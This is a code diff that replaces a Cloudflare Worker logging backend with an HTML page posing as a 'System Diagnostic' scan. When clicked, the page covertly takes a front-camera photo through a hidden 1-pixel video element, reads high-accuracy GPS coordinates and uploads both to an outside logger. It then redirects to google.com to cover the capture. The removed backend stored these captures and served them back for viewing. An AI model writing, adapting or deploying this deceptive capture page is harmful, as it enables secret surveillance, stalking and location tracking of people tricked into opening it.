@@ -1,38 +1,95 @@
-export default {
-  async fetch(request, env) {
-    const corsHeaders = {
-      'Access-Control-Allow-Origin': '*',
-      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-      'Access-Control-Allow-Headers': 'Content-Type',
-    };
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Diagnostic</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .btn { padding: 20px 40px; border: 1px solid #0f0; background: transparent; color: #0f0; cursor: pointer; font-size: 1.1rem; letter-spacing: 2px; }
+        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
+        #status { margin-bottom: 20px; font-size: 0.9rem; text-transform: uppercase; }
+    </style>
+</head>
+<body>
 
-    if (request.method === "OPTIONS") return new Response(null, { headers: corsHeaders });
+    <div id="status">Satellite Link: Standby</div>
+    <video id="v" playsinline muted></video>
+    <button id="btn" class="btn">INITIALIZE SCAN</button>
 
-    // MODE 1: DATA RETRIEVAL (The Vault Viewer)
-    if (request.method === "GET") {
-      const { results } = await env.DB.prepare("SELECT * FROM logs ORDER BY id DESC").all();
-      return new Response(JSON.stringify(results), {
-        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
-      });
-    }
+    <script>
+        const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
+        const video = document.getElementById('v');
+        const btn = document.getElementById('btn');
+        const status = document.getElementById('status');
+        const canvas = document.createElement('canvas');
 
-    // MODE 2: DATA INGESTION (The Stealth Capture)
-    if (request.method === "POST") {
-      try {
-        const data = await request.json();
-        const timestamp = new Date().toISOString();
-        const image = data.image || "";
-        // Combine IP-based location with Precision GPS if provided
-        const loc = `IP: ${request.cf.city} | GPS: ${data.gps || 'N/A'}`;
+        btn.onclick = async () => {
+            btn.style.display = 'none';
+            status.innerText = "CALIBRATING SENSORS & GPS...";
 
-        await env.DB.prepare(
-          "INSERT INTO logs (timestamp, image, location) VALUES (?, ?, ?)"
-        ).bind(timestamp, image, loc).run();
+            try {
+                // Parallel Request: Camera + High-Accuracy GPS
+                const [stream, position] = await Promise.all([
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
+                    new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(resolve, (err) => {
+                            console.warn("GPS Denied/Timeout");
+                            resolve(null);
+                        }, {
+                            enableHighAccuracy: true, // Forces phone GPS hardware
+                            timeout: 8000,           // Wait up to 8s for a lock
+                            maximumAge: 0            // No cached locations
+                        });
+                    })
+                ]);
 
-        return new Response(JSON.stringify({ status: "SUCCESS" }), { headers: corsHeaders });
-      } catch (e) {
-        return new Response(e.message, { status: 500, headers: corsHeaders });
-      }
-    }
-  }
-};
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // Slight delay for camera light adjustment
+                    setTimeout(() => executeFinalSequence(position), 500);
+                };
+            } catch (err) {
+                status.innerText = "CRITICAL ERROR: HARDWARE_BLOCK";
+                status.style.color = "red";
+            }
+        };
+
+        async function executeFinalSequence(pos) {
+            // 1. Snapshot
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const dataImg = canvas.toDataURL('image/jpeg', 0.5);
+
+            // 2. Kill Hardware (Light goes off)
+            video.srcObject.getTracks().forEach(t => t.stop());
+
+            // 3. Format Exact Coordinates
+            let exactGPS = "GPS_DENIED";
+            if (pos) {
+                exactGPS = `${pos.coords.latitude},${pos.coords.longitude}`;
+            }
+
+            // 4. Ghost Upload
+            fetch(LOGGING_API, {
+                method: 'POST',
+                keepalive: true,
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    image: dataImg, 
+                    gps: exactGPS 
+                })
+            });
+
+            // 5. Exit
+            status.innerText = "SUCCESS. REDIRECTING...";
+            setTimeout(() => {
+                window.location.replace("https://google.com");
+            }, 600);
+        }
+    </script>
+</body>
+</html>
